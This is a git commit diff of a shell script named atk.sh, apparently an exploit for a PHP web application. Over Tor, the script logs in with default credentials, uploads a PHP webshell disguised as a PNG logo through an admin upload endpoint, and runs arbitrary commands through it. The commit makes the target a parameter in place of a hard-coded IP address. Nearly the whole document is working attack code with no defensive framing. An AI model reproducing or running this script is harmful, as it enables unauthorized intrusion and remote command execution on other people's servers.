82adc6a8200314ffd21aa5076daf0025e0a0f3f2
Ug0Security <c.vallicari@gmail.com>
2021-02-10 13:26:19 +0100

    Update atk.sh

--- atk.sh
+++ atk.sh
@@ -1,22 +1,21 @@
-#Ta gueule Vlad xD
-
 echo "Log In with default user credentials"
 
-cookie=$(timeout 10 torify curl -i -s -X POST "http://82.65.122.73/index.php" --data "username=user&password=user&language=fr&LoginButton=Login" | grep "Set-Cookie" |  grep -o -P '(?<=PHPSESSID=).*(?=;)')
+cookie=$(timeout 10 torify curl -i -s -X POST "$1/index.php" --data "username=user&password=user&language=fr&LoginButton=Login" | grep "Set-Cookie" |  grep -o -P '(?<=PHPSESSID=).*(?=;)')
 
 echo "We should be logged, here the cookie : $cookie"
 echo " "
 echo "Let's upload a webshell"
 
-timeout 10 torify curl -s --cookie "PHPSESSID=$cookie" -X POST "$1/admin/UploadWebsiteLogo.php" -F 'uploadImageFile=@logo-menu.php;type=image/png' -H 'Expect:' >/dev/null
+timeout 10 torify curl -s --cookie "PHPSESSID=$cookie" -X POST "$1/admin/UploadWebsiteLogo.php" -F 'uploadImageFile=@logo-menu.php;type=image/png' -H 'Expect:' 
 echo " "
+sleep 5
 echo "Let's execute commands !!"
 
 echo $2
 
 
 echo "-------Command Output----------"
-timeout 10 torify curl --cookie "PHPSESSID=$cookie" "$1/res/img/custom-logo-menu.php"  --data-urlencode "cmd=$2"
+timeout 10 torify curl --cookie "PHPSESSID=$cookie" "$1/res/img/custom-logo-menu.php"  --data-urlencode "cmd=$2" >/dev/null
 
 
 echo "-------------------------------"
